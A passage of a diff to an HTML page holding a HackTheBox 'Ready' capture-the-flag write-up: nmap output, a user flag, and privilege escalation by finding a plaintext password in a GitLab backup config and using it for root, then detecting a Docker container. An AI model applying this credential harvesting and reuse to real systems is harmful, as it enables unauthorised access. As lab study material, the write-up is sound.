@@ -4,6 +4,7 @@
 		<meta charset="utf-8" />
 		<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
 		<link rel="stylesheet" href="/assets/css/main.css" />
+		<link rel="stylesheet" href="/assets/css/main.css" />
 		<noscript><link rel="stylesheet" href="/assets/css/noscript.css" /></noscript>
 	</head>
 	<body class="is-preload">
@@ -43,7 +44,7 @@
 		    </section>
 
       <section id="wrapper">
-<section class="wrapper spotlight style5 ">
+<section class="wrapper spotlight style1 ">
 <div class="inner">
 <div class="main_image"><img src=/images/writeups/htb_machines/ready/ready.png alt="" /></div>
 <div class="content">
@@ -59,7 +60,7 @@
 </div>
 </div>
 </section>
-<section class="wrapper style2 alt">
+<section class="wrapper style6 alt">
 <div class="inner">
 <div class="content">
 
@@ -73,29 +74,31 @@
  </em>
  .
 </p>
-<pre class="codehilite"><code>Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-22 13:03 AWST
-Nmap scan report for ready.htb (10.10.10.220)
-Host is up (0.059s latency).
+<div class="codehilite">
+ <pre><span></span><code><span class="nt">Starting</span><span class="w"> </span><span class="nt">Nmap</span><span class="w"> </span><span class="nt">7</span><span class="p">.</span><span class="nc">91</span><span class="w"> </span><span class="o">(</span><span class="w"> </span><span class="nt">https</span><span class="o">://</span><span class="nt">nmap</span><span class="p">.</span><span class="nc">org</span><span class="w"> </span><span class="o">)</span><span class="w"> </span><span class="nt">at</span><span class="w"> </span><span class="nt">2020-12-22</span><span class="w"> </span><span class="nt">13</span><span class="p">:</span><span class="nd">03</span><span class="w"> </span><span class="nt">AWST</span><span class="w"></span>
+<span class="nt">Nmap</span><span class="w"> </span><span class="nt">scan</span><span class="w"> </span><span class="nt">report</span><span class="w"> </span><span class="nt">for</span><span class="w"> </span><span class="nt">ready</span><span class="p">.</span><span class="nc">htb</span><span class="w"> </span><span class="o">(</span><span class="nt">10</span><span class="p">.</span><span class="nc">10</span><span class="p">.</span><span class="nc">10</span><span class="p">.</span><span class="nc">220</span><span class="o">)</span><span class="w"></span>
+<span class="nt">Host</span><span class="w"> </span><span class="nt">is</span><span class="w"> </span><span class="nt">up</span><span class="w"> </span><span class="o">(</span><span class="nt">0</span><span class="p">.</span><span class="nc">059s</span><span class="w"> </span><span class="nt">latency</span><span class="o">).</span><span class="w"></span>
 
-PORT     STATE SERVICE VERSION
-22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey:
-|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
-|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
-|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
-5080/tcp open  http    nginx
-| http-robots.txt: 53 disallowed entries (15 shown)
-| / /autocomplete/users /search /api /admin /profile
-| /dashboard /projects/new /groups/new /groups/*/edit /users /help
-|_/s/ /snippets/new /snippets/*/edit
-| http-title: Sign in \xC2\xB7 GitLab
-|_Requested resource was http://ready.htb:5080/users/sign_in
-|_http-trane-info: Problem with XML parsing of /evox/about
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+<span class="nt">PORT</span><span class="w">     </span><span class="nt">STATE</span><span class="w"> </span><span class="nt">SERVICE</span><span class="w"> </span><span class="nt">VERSION</span><span class="w"></span>
+<span class="nt">22</span><span class="o">/</span><span class="nt">tcp</span><span class="w">   </span><span class="nt">open</span><span class="w">  </span><span class="nt">ssh</span><span class="w">     </span><span class="nt">OpenSSH</span><span class="w"> </span><span class="nt">8</span><span class="p">.</span><span class="nc">2p1</span><span class="w"> </span><span class="nt">Ubuntu</span><span class="w"> </span><span class="nt">4</span><span class="w"> </span><span class="o">(</span><span class="nt">Ubuntu</span><span class="w"> </span><span class="nt">Linux</span><span class="o">;</span><span class="w"> </span><span class="nt">protocol</span><span class="w"> </span><span class="nt">2</span><span class="p">.</span><span class="nc">0</span><span class="o">)</span><span class="w"></span>
+<span class="o">|</span><span class="w"> </span><span class="nt">ssh-hostkey</span><span class="o">:</span><span class="w"></span>
+<span class="o">|</span><span class="w">   </span><span class="nt">3072</span><span class="w"> </span><span class="nt">48</span><span class="p">:</span><span class="nd">ad</span><span class="p">:</span><span class="nd">d5</span><span class="p">:</span><span class="nd">b8</span><span class="p">:</span><span class="nd">3a</span><span class="p">:</span><span class="nd">9f</span><span class="p">:</span><span class="nd">bc</span><span class="p">:</span><span class="nd">be</span><span class="p">:</span><span class="nd">f7</span><span class="p">:</span><span class="nd">e8</span><span class="p">:</span><span class="nd">20</span><span class="p">:</span><span class="nd">1e</span><span class="p">:</span><span class="nd">f6</span><span class="p">:</span><span class="nd">bf</span><span class="p">:</span><span class="nd">de</span><span class="p">:</span><span class="nd">ae</span><span class="w"> </span><span class="o">(</span><span class="nt">RSA</span><span class="o">)</span><span class="w"></span>
+<span class="o">|</span><span class="w">   </span><span class="nt">256</span><span class="w"> </span><span class="nt">b7</span><span class="p">:</span><span class="nd">89</span><span class="p">:</span><span class="nd">6c</span><span class="p">:</span><span class="nd">0b</span><span class="p">:</span><span class="nd">20</span><span class="p">:</span><span class="nd">ed</span><span class="p">:</span><span class="nd">49</span><span class="p">:</span><span class="nd">b2</span><span class="p">:</span><span class="nd">c1</span><span class="p">:</span><span class="nd">86</span><span class="p">:</span><span class="nd">7c</span><span class="p">:</span><span class="nd">29</span><span class="p">:</span><span class="nd">92</span><span class="p">:</span><span class="nd">74</span><span class="p">:</span><span class="nd">1c</span><span class="p">:</span><span class="nd">1f</span><span class="w"> </span><span class="o">(</span><span class="nt">ECDSA</span><span class="o">)</span><span class="w"></span>
+<span class="o">|</span><span class="nt">_</span><span class="w">  </span><span class="nt">256</span><span class="w"> </span><span class="nt">18</span><span class="p">:</span><span class="nd">cd</span><span class="p">:</span><span class="nd">9d</span><span class="p">:</span><span class="nd">08</span><span class="p">:</span><span class="nd">a6</span><span class="p">:</span><span class="nd">21</span><span class="p">:</span><span class="nd">a8</span><span class="p">:</span><span class="nd">b8</span><span class="p">:</span><span class="nd">b6</span><span class="p">:</span><span class="nd">f7</span><span class="p">:</span><span class="nd">9f</span><span class="p">:</span><span class="nd">8d</span><span class="p">:</span><span class="nd">40</span><span class="p">:</span><span class="nd">51</span><span class="p">:</span><span class="nd">54</span><span class="p">:</span><span class="nd">fb</span><span class="w"> </span><span class="o">(</span><span class="nt">ED25519</span><span class="o">)</span><span class="w"></span>
+<span class="nt">5080</span><span class="o">/</span><span class="nt">tcp</span><span class="w"> </span><span class="nt">open</span><span class="w">  </span><span class="nt">http</span><span class="w">    </span><span class="nt">nginx</span><span class="w"></span>
+<span class="o">|</span><span class="w"> </span><span class="nt">http-robots</span><span class="p">.</span><span class="nc">txt</span><span class="o">:</span><span class="w"> </span><span class="nt">53</span><span class="w"> </span><span class="nt">disallowed</span><span class="w"> </span><span class="nt">entries</span><span class="w"> </span><span class="o">(</span><span class="nt">15</span><span class="w"> </span><span class="nt">shown</span><span class="o">)</span><span class="w"></span>
+<span class="o">|</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="o">/</span><span class="nt">autocomplete</span><span class="o">/</span><span class="nt">users</span><span class="w"> </span><span class="o">/</span><span class="nt">search</span><span class="w"> </span><span class="o">/</span><span class="nt">api</span><span class="w"> </span><span class="o">/</span><span class="nt">admin</span><span class="w"> </span><span class="o">/</span><span class="nt">profile</span><span class="w"></span>
+<span class="o">|</span><span class="w"> </span><span class="o">/</span><span class="nt">dashboard</span><span class="w"> </span><span class="o">/</span><span class="nt">projects</span><span class="o">/</span><span class="nt">new</span><span class="w"> </span><span class="o">/</span><span class="nt">groups</span><span class="o">/</span><span class="nt">new</span><span class="w"> </span><span class="o">/</span><span class="nt">groups</span><span class="c">/*/edit /users /help</span>
+<span class="c">|_/s/ /snippets/new /snippets/*/</span><span class="nt">edit</span><span class="w"></span>
+<span class="o">|</span><span class="w"> </span><span class="nt">http-title</span><span class="o">:</span><span class="w"> </span><span class="nt">Sign</span><span class="w"> </span><span class="nt">in</span><span class="w"> </span><span class="err">\</span><span class="nt">xC2</span><span class="err">\</span><span class="nt">xB7</span><span class="w"> </span><span class="nt">GitLab</span><span class="w"></span>
+<span class="o">|</span><span class="nt">_Requested</span><span class="w"> </span><span class="nt">resource</span><span class="w"> </span><span class="nt">was</span><span class="w"> </span><span class="nt">http</span><span class="o">://</span><span class="nt">ready</span><span class="p">.</span><span class="nc">htb</span><span class="p">:</span><span class="nd">5080</span><span class="o">/</span><span class="nt">users</span><span class="o">/</span><span class="nt">sign_in</span><span class="w"></span>
+<span class="o">|</span><span class="nt">_http-trane-info</span><span class="o">:</span><span class="w"> </span><span class="nt">Problem</span><span class="w"> </span><span class="nt">with</span><span class="w"> </span><span class="nt">XML</span><span class="w"> </span><span class="nt">parsing</span><span class="w"> </span><span class="nt">of</span><span class="w"> </span><span class="o">/</span><span class="nt">evox</span><span class="o">/</span><span class="nt">about</span><span class="w"></span>
+<span class="nt">Service</span><span class="w"> </span><span class="nt">Info</span><span class="o">:</span><span class="w"> </span><span class="nt">OS</span><span class="o">:</span><span class="w"> </span><span class="nt">Linux</span><span class="o">;</span><span class="w"> </span><span class="nt">CPE</span><span class="o">:</span><span class="w"> </span><span class="nt">cpe</span><span class="o">:/</span><span class="nt">o</span><span class="p">:</span><span class="nd">linux</span><span class="p">:</span><span class="nd">linux_kernel</span><span class="w"></span>
 
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 14.59 seconds
+<span class="nt">Service</span><span class="w"> </span><span class="nt">detection</span><span class="w"> </span><span class="nt">performed</span><span class="o">.</span><span class="w"> </span><span class="nt">Please</span><span class="w"> </span><span class="nt">report</span><span class="w"> </span><span class="nt">any</span><span class="w"> </span><span class="nt">incorrect</span><span class="w"> </span><span class="nt">results</span><span class="w"> </span><span class="nt">at</span><span class="w"> </span><span class="nt">https</span><span class="o">://</span><span class="nt">nmap</span><span class="p">.</span><span class="nc">org</span><span class="o">/</span><span class="nt">submit</span><span class="o">/</span><span class="w"> </span><span class="o">.</span><span class="w"></span>
+<span class="nt">Nmap</span><span class="w"> </span><span class="nt">done</span><span class="o">:</span><span class="w"> </span><span class="nt">1</span><span class="w"> </span><span class="nt">IP</span><span class="w"> </span><span class="nt">address</span><span class="w"> </span><span class="o">(</span><span class="nt">1</span><span class="w"> </span><span class="nt">host</span><span class="w"> </span><span class="nt">up</span><span class="o">)</span><span class="w"> </span><span class="nt">scanned</span><span class="w"> </span><span class="nt">in</span><span class="w"> </span><span class="nt">14</span><span class="p">.</span><span class="nc">59</span><span class="w"> </span><span class="nt">seconds</span><span class="w"></span>
 </code></pre>
+</div>
 <p>
  The first thing I tried was the LFI to RCE exploit that was the foothold vector for Laboratory. Unfortunately, I did not start this box sooner and HTB staff had already patched those vulnerabilities (from what I heard reading the forum).
 </p>
@@ -144,7 +147,7 @@ Nmap done: 1 IP address (1 host up) scanned in 14.59 seconds
 </div>
 </div>
 </section>
-<section class="wrapper style6 ">
+<section class="wrapper style5 ">
 <div class="inner">
 <div class="content">
 
@@ -161,17 +164,19 @@ Nmap done: 1 IP address (1 host up) scanned in 14.59 seconds
   ls -al
  </code>
 </p>
-<pre class="codehilite"><code>git@gitlab:/home/dude$ ls -al
-ls -al
-total 24
-drwxr-xr-x 2 dude dude 4096 Dec  7 16:58 .
-drwxr-xr-x 1 root root 4096 Dec  2 10:45 ..
-lrwxrwxrwx 1 root root    9 Dec  7 16:58 .bash_history -&gt; /dev/null
--rw-r--r-- 1 dude dude  220 Aug 31  2015 .bash_logout
--rw-r--r-- 1 dude dude 3771 Aug 31  2015 .bashrc
--rw-r--r-- 1 dude dude  655 May 16  2017 .profile
--r--r----- 1 dude git    33 Dec  2 10:46 user.txt
+<div class="codehilite">
+ <pre><span></span><code><span class="n">git</span><span class="nv">@gitlab</span><span class="err">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">dude</span><span class="err">$</span><span class="w"> </span><span class="n">ls</span><span class="w"> </span><span class="o">-</span><span class="n">al</span><span class="w"></span>
+<span class="n">ls</span><span class="w"> </span><span class="o">-</span><span class="n">al</span><span class="w"></span>
+<span class="n">total</span><span class="w"> </span><span class="mi">24</span><span class="w"></span>
+<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="n">dude</span><span class="w"> </span><span class="n">dude</span><span class="w"> </span><span class="mi">4096</span><span class="w"> </span><span class="k">Dec</span><span class="w">  </span><span class="mi">7</span><span class="w"> </span><span class="mi">16</span><span class="err">:</span><span class="mi">58</span><span class="w"> </span><span class="p">.</span><span class="w"></span>
+<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="mi">4096</span><span class="w"> </span><span class="k">Dec</span><span class="w">  </span><span class="mi">2</span><span class="w"> </span><span class="mi">10</span><span class="err">:</span><span class="mi">45</span><span class="w"> </span><span class="p">..</span><span class="w"></span>
+<span class="n">lrwxrwxrwx</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">root</span><span class="w">    </span><span class="mi">9</span><span class="w"> </span><span class="k">Dec</span><span class="w">  </span><span class="mi">7</span><span class="w"> </span><span class="mi">16</span><span class="err">:</span><span class="mi">58</span><span class="w"> </span><span class="p">.</span><span class="n">bash_history</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="k">null</span><span class="w"></span>
+<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">dude</span><span class="w"> </span><span class="n">dude</span><span class="w">  </span><span class="mi">220</span><span class="w"> </span><span class="n">Aug</span><span class="w"> </span><span class="mi">31</span><span class="w">  </span><span class="mi">2015</span><span class="w"> </span><span class="p">.</span><span class="n">bash_logout</span><span class="w"></span>
+<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">dude</span><span class="w"> </span><span class="n">dude</span><span class="w"> </span><span class="mi">3771</span><span class="w"> </span><span class="n">Aug</span><span class="w"> </span><span class="mi">31</span><span class="w">  </span><span class="mi">2015</span><span class="w"> </span><span class="p">.</span><span class="n">bashrc</span><span class="w"></span>
+<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">dude</span><span class="w"> </span><span class="n">dude</span><span class="w">  </span><span class="mi">655</span><span class="w"> </span><span class="n">May</span><span class="w"> </span><span class="mi">16</span><span class="w">  </span><span class="mi">2017</span><span class="w"> </span><span class="p">.</span><span class="n">profile</span><span class="w"></span>
+<span class="o">-</span><span class="n">r</span><span class="c1">--r----- 1 dude git    33 Dec  2 10:46 user.txt</span>
 </code></pre>
+</div>
 <p>
  Oh neat, I am part of the group
  <code>
@@ -179,10 +184,12 @@ lrwxrwxrwx 1 root root    9 Dec  7 16:58 .bash_history -&gt; /dev/null
  </code>
  ! Let's just get the flag.
 </p>
-<pre class="codehilite"><code>git@gitlab:/home/dude$ cat user.txt
-cat user.txt
-e1e30b052b6ec0670698805d745e7682
+<div class="codehilite">
+ <pre><span></span><code><span class="n">git</span><span class="nv">@gitlab</span><span class="err">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">dude</span><span class="err">$</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="k">user</span><span class="p">.</span><span class="n">txt</span><span class="w"></span>
+<span class="n">cat</span><span class="w"> </span><span class="k">user</span><span class="p">.</span><span class="n">txt</span><span class="w"></span>
+<span class="n">e1e30b052b6ec0670698805d745e7682</span><span class="w"></span>
 </code></pre>
+</div>
 <p>
  <em>
   Super hard!
@@ -191,7 +198,7 @@ e1e30b052b6ec0670698805d745e7682
 </div>
 </div>
 </section>
-<section class="wrapper style3 alt">
+<section class="wrapper style2 alt">
 <div class="inner">
 <div class="content">
 
@@ -220,15 +227,17 @@ e1e30b052b6ec0670698805d745e7682
  </code>
  .
 </p>
-<pre class="codehilite"><code>git@gitlab:/opt/backup$ ls -al
-ls -al
-total 112
-drwxr-xr-x 2 root root  4096 Dec  7 09:25 .
-drwxr-xr-x 1 root root  4096 Dec  1 16:23 ..
--rw-r--r-- 1 root root   872 Dec  7 09:25 docker-compose.yml
--rw-r--r-- 1 root root 15092 Dec  1 16:23 gitlab-secrets.json
--rw-r--r-- 1 root root 79639 Dec  1 19:20 gitlab.rb
+<div class="codehilite">
+ <pre><span></span><code><span class="n">git</span><span class="nv">@gitlab</span><span class="err">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="k">backup</span><span class="err">$</span><span class="w"> </span><span class="n">ls</span><span class="w"> </span><span class="o">-</span><span class="n">al</span><span class="w"></span>
+<span class="n">ls</span><span class="w"> </span><span class="o">-</span><span class="n">al</span><span class="w"></span>
+<span class="n">total</span><span class="w"> </span><span class="mi">112</span><span class="w"></span>
+<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">root</span><span class="w">  </span><span class="mi">4096</span><span class="w"> </span><span class="k">Dec</span><span class="w">  </span><span class="mi">7</span><span class="w"> </span><span class="mi">09</span><span class="err">:</span><span class="mi">25</span><span class="w"> </span><span class="p">.</span><span class="w"></span>
+<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">root</span><span class="w">  </span><span class="mi">4096</span><span class="w"> </span><span class="k">Dec</span><span class="w">  </span><span class="mi">1</span><span class="w"> </span><span class="mi">16</span><span class="err">:</span><span class="mi">23</span><span class="w"> </span><span class="p">..</span><span class="w"></span>
+<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">root</span><span class="w">   </span><span class="mi">872</span><span class="w"> </span><span class="k">Dec</span><span class="w">  </span><span class="mi">7</span><span class="w"> </span><span class="mi">09</span><span class="err">:</span><span class="mi">25</span><span class="w"> </span><span class="n">docker</span><span class="o">-</span><span class="n">compose</span><span class="p">.</span><span class="n">yml</span><span class="w"></span>
+<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="mi">15092</span><span class="w"> </span><span class="k">Dec</span><span class="w">  </span><span class="mi">1</span><span class="w"> </span><span class="mi">16</span><span class="err">:</span><span class="mi">23</span><span class="w"> </span><span class="n">gitlab</span><span class="o">-</span><span class="n">secrets</span><span class="p">.</span><span class="n">json</span><span class="w"></span>
+<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="c1">--r-- 1 root root 79639 Dec  1 19:20 gitlab.rb</span>
 </code></pre>
+</div>
 <p>
  Classic me, I immediately went down a rabbit hole and spent a solid 30 minutes investigating if I had to use
  <code>
@@ -240,10 +249,12 @@ drwxr-xr-x 1 root root  4096 Dec  1 16:23 ..
  </code>
  ...
 </p>
-<pre class="codehilite"><code>git@gitlab:/opt/backup$ grep "gitlab_rails" docker-compose.yml
-grep "gitlab_rails" docker-compose.yml
-        gitlab_rails['initial_root_password']=File.read('/root_pass')
+<div class="codehilite">
+ <pre><span></span><code><span class="n">git</span><span class="nv">@gitlab</span><span class="err">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="k">backup</span><span class="err">$</span><span class="w"> </span><span class="n">grep</span><span class="w"> </span><span class="ss">"gitlab_rails"</span><span class="w"> </span><span class="n">docker</span><span class="o">-</span><span class="n">compose</span><span class="p">.</span><span class="n">yml</span><span class="w"></span>
+<span class="n">grep</span><span class="w"> </span><span class="ss">"gitlab_rails"</span><span class="w"> </span><span class="n">docker</span><span class="o">-</span><span class="n">compose</span><span class="p">.</span><span class="n">yml</span><span class="w"></span>
+<span class="w">        </span><span class="n">gitlab_rails</span><span class="o">[</span><span class="n">'initial_root_password'</span><span class="o">]=</span><span class="k">File</span><span class="p">.</span><span class="k">read</span><span class="p">(</span><span class="s1">'/root_pass'</span><span class="p">)</span><span class="w"></span>
 </code></pre>
+</div>
 <p>
  <em>
   That was another lie.
@@ -260,10 +271,12 @@ grep "gitlab_rails" docker-compose.yml
  </code>
  to just filter for the uncommented lines.
 </p>
-<pre class="codehilite"><code>git@gitlab:/opt/backup$ grep -v "^#" gitlab.rb | grep -v "^$"
-grep -v "^#" gitlab.rb | grep -v "^$"
-gitlab_rails['smtp_password'] = "wW59U!ZKMbG9+*#h"
+<div class="codehilite">
+ <pre><span></span><code><span class="n">git</span><span class="nv">@gitlab</span><span class="err">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="k">backup</span><span class="err">$</span><span class="w"> </span><span class="n">grep</span><span class="w"> </span><span class="o">-</span><span class="n">v</span><span class="w"> </span><span class="ss">"^#"</span><span class="w"> </span><span class="n">gitlab</span><span class="p">.</span><span class="n">rb</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">grep</span><span class="w"> </span><span class="o">-</span><span class="n">v</span><span class="w"> </span><span class="ss">"^$"</span><span class="w"></span>
+<span class="n">grep</span><span class="w"> </span><span class="o">-</span><span class="n">v</span><span class="w"> </span><span class="ss">"^#"</span><span class="w"> </span><span class="n">gitlab</span><span class="p">.</span><span class="n">rb</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">grep</span><span class="w"> </span><span class="o">-</span><span class="n">v</span><span class="w"> </span><span class="ss">"^$"</span><span class="w"></span>
+<span class="n">gitlab_rails</span><span class="o">[</span><span class="n">'smtp_password'</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ss">"wW59U!ZKMbG9+*#h"</span><span class="w"></span>
 </code></pre>
+</div>
 <p>
  No idea why the SMTP password was the only thing set in
  <code>
@@ -271,8 +284,10 @@ gitlab_rails['smtp_password'] = "wW59U!ZKMbG9+*#h"
  </code>
  , besides it being the password for a different user... classic HTB move there. I could already switch users since I spawned a TTY reverse shell when I got initial, but if you do not have a TTY shell to switch users you can just run the following command.
 </p>
-<pre class="codehilite"><code>python3 -c "import pty;pty.spawn('/bin/bash')"
+<div class="codehilite">
+ <pre><span></span><code><span class="n">python3</span> <span class="o">-</span><span class="n">c</span> <span class="s2">"import pty;pty.spawn('/bin/bash')"</span>
 </code></pre>
+</div>
 <p>
  Checking if the password is for the
  <code>
@@ -280,12 +295,14 @@ gitlab_rails['smtp_password'] = "wW59U!ZKMbG9+*#h"
  </code>
  account gives us the treasure!
 </p>
-<pre class="codehilite"><code>git@gitlab:/opt/backup$ su root
-su root
-Password: wW59U!ZKMbG9+*#h
+<div class="codehilite">
+ <pre><span></span><code><span class="n">git</span><span class="nv">@gitlab</span><span class="err">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="k">backup</span><span class="err">$</span><span class="w"> </span><span class="n">su</span><span class="w"> </span><span class="n">root</span><span class="w"></span>
+<span class="n">su</span><span class="w"> </span><span class="n">root</span><span class="w"></span>
+<span class="nl">Password</span><span class="p">:</span><span class="w"> </span><span class="n">wW59U</span><span class="err">!</span><span class="n">ZKMbG9</span><span class="o">+*</span><span class="n">#h</span><span class="w"></span>
 
-root@gitlab:/opt/backup#
+<span class="n">root</span><span class="nv">@gitlab</span><span class="err">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="k">backup</span><span class="err">#</span><span class="w"></span>
 </code></pre>
+</div>
 <p>
  However...
 </p>
@@ -299,17 +316,19 @@ root@gitlab:/opt/backup#
   THAT ROOT IS A LIE AND WE DO NOT HAVE THE FLAG!
  </strong>
 </p>
-<pre class="codehilite"><code>root@gitlab:~# ls -al
-ls -al
-total 24
-drwx------ 1 root root 4096 Dec 13 15:06 .
-drwxr-xr-x 1 root root 4096 Dec  1 12:41 ..
-lrwxrwxrwx 1 root root    9 Dec  7 16:56 .bash_history -&gt; /dev/null
--rw-r--r-- 1 root root 3106 Oct 22  2015 .bashrc
--rw-r--r-- 1 root root  148 Aug 17  2015 .profile
-drwx------ 2 root root 4096 Dec  7 16:49 .ssh
--rw------- 1 root root 1565 Dec 13 15:06 .viminfo
+<div class="codehilite">
+ <pre><span></span><code><span class="n">root</span><span class="nv">@gitlab</span><span class="err">:</span><span class="o">~</span><span class="err">#</span><span class="w"> </span><span class="n">ls</span><span class="w"> </span><span class="o">-</span><span class="n">al</span><span class="w"></span>
+<span class="n">ls</span><span class="w"> </span><span class="o">-</span><span class="n">al</span><span class="w"></span>
+<span class="n">total</span><span class="w"> </span><span class="mi">24</span><span class="w"></span>
+<span class="n">drwx</span><span class="o">------</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="mi">4096</span><span class="w"> </span><span class="k">Dec</span><span class="w"> </span><span class="mi">13</span><span class="w"> </span><span class="mi">15</span><span class="err">:</span><span class="mi">06</span><span class="w"> </span><span class="p">.</span><span class="w"></span>
+<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="mi">4096</span><span class="w"> </span><span class="k">Dec</span><span class="w">  </span><span class="mi">1</span><span class="w"> </span><span class="mi">12</span><span class="err">:</span><span class="mi">41</span><span class="w"> </span><span class="p">..</span><span class="w"></span>
+<span class="n">lrwxrwxrwx</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">root</span><span class="w">    </span><span class="mi">9</span><span class="w"> </span><span class="k">Dec</span><span class="w">  </span><span class="mi">7</span><span class="w"> </span><span class="mi">16</span><span class="err">:</span><span class="mi">56</span><span class="w"> </span><span class="p">.</span><span class="n">bash_history</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="k">null</span><span class="w"></span>
+<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="mi">3106</span><span class="w"> </span><span class="n">Oct</span><span class="w"> </span><span class="mi">22</span><span class="w">  </span><span class="mi">2015</span><span class="w"> </span><span class="p">.</span><span class="n">bashrc</span><span class="w"></span>
+<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">root</span><span class="w">  </span><span class="mi">148</span><span class="w"> </span><span class="n">Aug</span><span class="w"> </span><span class="mi">17</span><span class="w">  </span><span class="mi">2015</span><span class="w"> </span><span class="p">.</span><span class="n">profile</span><span class="w"></span>
+<span class="n">drwx</span><span class="o">------</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="mi">4096</span><span class="w"> </span><span class="k">Dec</span><span class="w">  </span><span class="mi">7</span><span class="w"> </span><span class="mi">16</span><span class="err">:</span><span class="mi">49</span><span class="w"> </span><span class="p">.</span><span class="n">ssh</span><span class="w"></span>
+<span class="o">-</span><span class="n">rw</span><span class="c1">------- 1 root root 1565 Dec 13 15:06 .viminfo</span>
 </code></pre>
+</div>
 <p>
  <em>
   Looks like I have to do a bit more work :(
@@ -318,7 +337,7 @@ drwx------ 2 root root 4096 Dec  7 16:49 .ssh
 </div>
 </div>
 </section>
-<section class="wrapper style4 ">
+<section class="wrapper style3 ">
 <div class="inner">
 <div class="content">
 
@@ -340,22 +359,24 @@ drwx------ 2 root root 4096 Dec  7 16:49 .ssh
  </code>
  gives me some information about where I am.
 </p>
-<pre class="codehilite"><code>root@gitlab:~# cat /proc/1/cgroup
-cat /proc/1/cgroup
-12:perf_event:/docker/7eb263389e5eea068ad3d0c208ea4dd02ba86fa0b2ebd44f63adc391351fba6d
-11:net_cls,net_prio:/docker/7eb263389e5eea068ad3d0c208ea4dd02ba86fa0b2ebd44f63adc391351fba6d
-10:memory:/docker/7eb263389e5eea068ad3d0c208ea4dd02ba86fa0b2ebd44f63adc391351fba6d
-9:blkio:/docker/7eb263389e5eea068ad3d0c208ea4dd02ba86fa0b2ebd44f63adc391351fba6d
-8:cpu,cpuacct:/docker/7eb263389e5eea068ad3d0c208ea4dd02ba86fa0b2ebd44f63adc391351fba6d
-7:hugetlb:/docker/7eb263389e5eea068ad3d0c208ea4dd02ba86fa0b2ebd44f63adc391351fba6d
